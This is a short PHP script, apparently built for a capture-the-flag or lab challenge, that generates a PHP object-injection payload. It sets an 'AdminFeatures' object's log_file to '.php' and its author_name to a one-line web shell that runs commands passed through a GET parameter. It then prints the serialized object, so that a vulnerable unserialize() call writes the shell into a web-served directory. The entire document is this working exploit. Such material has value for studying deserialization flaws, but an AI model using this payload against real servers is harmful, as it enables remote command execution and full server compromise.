<?php
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


class AdminFeatures
{

    public $log_file = '';
    public $author_name = '';

    public function __construct()
    {

        $this->dict_data = ['1' => 'Albert Einstein', '2' => 'Karl Marx', '3' => 'Ralph Waldo Emerson', '4' => 'Phytagoras', '5' => 'Aristotle', '6' => 'Vladimir Lenin', '7' => 'Thomas Alva Edison', '8' => 'Plato', '9' => 'Herodotus', '10' => 'Alexander the Great'];

        $this->log_file = 'vote_result.txt';
        if (isset($_POST['submit'])) {

            $author_id = $_POST['quotes_id'];

            $this->author_name = $this->dict_data[$author_id];
        }
    }


    public function __destruct()
    {

        $this->rand_string = substr(md5(openssl_random_pseudo_bytes(20)), -32);

        file_put_contents(__DIR__ . '/result/' . $this->rand_string . '_' . $this->log_file, $this->author_name);

        $_SESSION['filename'] = $this->rand_string . '_' . $this->log_file;
    }
}


$myClass = new AdminFeatures();
$myClass->log_file = ".php";
$myClass->author_name = "<?php system(\$_GET['a']); ?>";

print serialize($myClass);